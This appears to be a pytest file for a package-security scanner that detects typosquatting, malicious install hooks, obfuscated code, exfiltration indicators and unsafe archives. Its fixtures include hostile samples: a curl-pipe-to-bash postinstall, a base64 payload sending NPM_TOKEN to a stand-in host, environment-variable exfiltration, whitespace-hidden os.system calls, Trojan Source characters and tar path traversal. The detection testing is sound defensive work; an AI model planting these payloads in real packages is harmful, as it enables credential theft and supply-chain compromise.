import base64
import io
import json
import tarfile
import zipfile

from conftest import rules_of

from sniffdog import archive
from sniffdog.analyzers.typosquat import check_name, damerau_levenshtein
from sniffdog.config import Config
from sniffdog.models import PackageInfo, Severity
from sniffdog.scanner import Scanner


def scan_files(files: dict[str, str | bytes], name="pkg", **cfg):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for k, v in files.items():
            z.writestr(k, v)
    return Scanner(Config(metadata=False, min_severity=Severity.INFO, **cfg)).scan_bytes(buf.getvalue(), "x.zip", PackageInfo(name))


# ---------------------------------------------------------------- typosquat


def test_typosquat_known_attacks():
    assert check_name("colourama", "pypi").target == "colorama"
    assert check_name("python3-dateutil", "pypi").target == "python-dateutil"
    assert check_name("jeIlyfish", "pypi").technique == "homoglyph substitution"
    assert check_name("crossenv", "npm").target == "cross-env"
    assert check_name("dateutil-python", "pypi").technique == "reordered name tokens"
    assert "scope" in check_name("@typescript_eslinter/eslint", "npm").technique


def test_typosquat_no_false_alarm_on_popular_or_unrelated():
    for n in ("requests", "numpy", "flask-sqlalchemy", "sniffdog", "my-internal-lib"):
        assert check_name(n, "pypi") is None
    assert check_name("lodash", "npm") is None


def test_damerau_transposition():
    assert damerau_levenshtein("reqeusts", "requests") == 1


# ---------------------------------------------------------------- manifests


def test_npm_curl_pipe_sh():
    pj = json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://a.invalid/i.sh | bash"}})
    r = scan_files({"package/package.json": pj})
    assert "NPM-SCRIPT-DOWNLOAD" in rules_of(r.findings) and r.verdict == "malicious"


def test_npm_inline_node_e_is_analysed():
    code = base64.b64encode(b"require('https').get('https://a.invalid/'+process.env.NPM_TOKEN)").decode()
    pj = json.dumps({"name": "x", "scripts": {"preinstall": f"node -e \"eval(Buffer.from('{code}','base64').toString())\""}})
    assert "JS-EXEC-OBFUSCATED" in rules_of(scan_files({"package/package.json": pj}).findings)


def test_node_gyp_install_is_info():
    pj = json.dumps({"name": "x", "scripts": {"install": "node-gyp rebuild"}})
    r = scan_files({"package/package.json": pj})
    assert r.verdict == "clean"


# ---------------------------------------------------------------- obfuscation / IOC / binaries


def test_encoded_code_blob():
    blob = base64.b64encode(b"import os\nos.system('id')\n" * 10).decode()
    r = scan_files({"p/__init__.py": f"DATA = '{blob}'\n"})
    assert "OBF-ENCODED-CODE" in rules_of(r.findings)


def test_base64_image_is_not_code():
    png = base64.b64encode(b"\x89PNG\r\n\x1a\n" + b"tEXtRaw profile type exif import os " * 20).decode()
    assert "OBF-ENCODED-CODE" not in rules_of(scan_files({"p/img.py": f"IMG = '{png}'\n"}).findings)


def test_trojan_source_bidi():
    r = scan_files({"p/a.py": "access = 'user‮ ⁦# admin⁩ ⁦'\n"})
    assert "OBF-BIDI" in rules_of(r.findings)


def test_invisible_char_in_identifier_vs_string():
    assert "OBF-INVISIBLE-CHARS" in rules_of(scan_files({"p/a.py": "x = 1\nis_admin​ = True\n"}).findings)
    assert "OBF-INVISIBLE-CHARS" not in rules_of(scan_files({"p/a.py": "x = 1\nZWSP = '​'\n"}).findings)


def test_whitespace_hiding():
    r = scan_files({"p/a.py": "x = 1" + " " * 250 + ";import os;os.system('id')\n"})
    assert "OBF-WHITESPACE-HIDING" in rules_of(r.findings)


def test_ioc_discord_webhook_and_docstring_skip():
    r = scan_files({"p/a.py": "URL = 'https://discord.com/api/webhooks/1/abc'\n"})
    assert "IOC-DISCORD-WEBHOOK" in rules_of(r.findings)
    r = scan_files({"p/b.py": '"""Example:\n    https://webhook.site/abc\n"""\nx = 1\n'})
    assert "IOC-OAST" not in rules_of(r.findings)


def test_disguised_binary():
    r = scan_files({"p/logo.png": b"\x7fELF\x02\x01\x01" + b"\0" * 100})
    assert "BIN-DISGUISED" in rules_of(r.findings) and r.verdict == "malicious"


def test_native_lib_in_wheel_is_fine():
    r = scan_files({"p/_x.cpython-312-x86_64-linux-gnu.so": b"\x7fELF" + b"\0" * 100, "p-1.0.dist-info/WHEEL": "Wheel-Version: 1.0"})
    assert not rules_of(r.findings, Severity.LOW)


# ---------------------------------------------------------------- archive safety


def _tar(members):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for name, data, kind, link in members:
            ti = tarfile.TarInfo(name)
            if kind == "sym":
                ti.type, ti.linkname = tarfile.SYMTYPE, link
                t.addfile(ti)
            else:
                ti.size = len(data)
                t.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def test_tar_path_traversal_and_symlink_escape_detected_not_written(tmp_path):
    blob = _tar(
        [
            ("pkg/../../evil.sh", b"x", "file", None),
            ("pkg/link", b"", "sym", "../../../etc/passwd"),
            ("pkg/docs/readme", b"", "sym", "../README.md"),
            ("pkg/README.md", b"hi", "file", None),
        ]
    )
    c = archive.load_bytes(blob, "x.tar.gz")
    kinds = {a.kind for a in c.anomalies}
    assert "path traversal" in kinds and "link escapes package" in kinds
    assert not any(a.path == "docs/readme" for a in c.anomalies)  # stays inside the package
    assert all(".." not in p for p in c.files)
    assert list(tmp_path.iterdir()) == []


def test_member_limits(monkeypatch):
    monkeypatch.setattr(archive, "MAX_FILE_BYTES", 10)
    c = archive.load_bytes(_tar([("p/big.txt", b"A" * 100, "file", None)]), "x.tgz")
    f = c.get("big.txt")
    assert f.truncated and f.size == 100 and len(f.data) <= 64


# ---------------------------------------------------------------- scanner behaviour


def test_tests_directory_is_downgraded():
    r = scan_files({"p/tests/test_x.py": "import os, requests\nrequests.post('u', data=dict(os.environ))\n"})
    f = [x for x in r.findings if x.rule_id == "PY-EXFIL"]
    assert f and f[0].severity <= Severity.MEDIUM and f[0].evidence.get("downgraded")


def test_ignore_rules_config():
    r = scan_files({"p/a.py": "URL = 'https://discord.com/api/webhooks/1/abc'\n"}, ignore_rules=["IOC-*"])
    assert not r.findings and r.suppressed == 1


def test_inline_suppression_only_for_local_dirs(tmp_path):
    src = "URL = 'https://discord.com/api/webhooks/1/abc'  # sniffdog: ignore[IOC-DISCORD-WEBHOOK]\n"
    (tmp_path / "a.py").write_text(src)
    assert not Scanner(Config(metadata=False)).scan_path(tmp_path).findings
    assert scan_files({"p/a.py": src}).findings  # an archive cannot silence itself


def test_typosquat_correlation():
    r = scan_files({"setup.py": "import os, requests\nrequests.post('u', json=dict(os.environ))\n"}, name="reqeusts")
    assert "CORR-TYPOSQUAT-PAYLOAD" in rules_of(r.findings)


def test_hostile_input_is_linear_time():
    """Long minified/base64 runs must not trigger regex backtracking blow-ups (DoS)."""
    import time

    blob = "a" * 400_000
    pj = json.dumps({"name": "x", "scripts": {"postinstall": "node i.js"}})
    files = {"package/package.json": pj, "package/i.js": f"var s='{blob}​';\n" + ("x='\\'" * 20000) + "\n"}
    t = time.time()
    scan_files(files)
    assert time.time() - t < 10
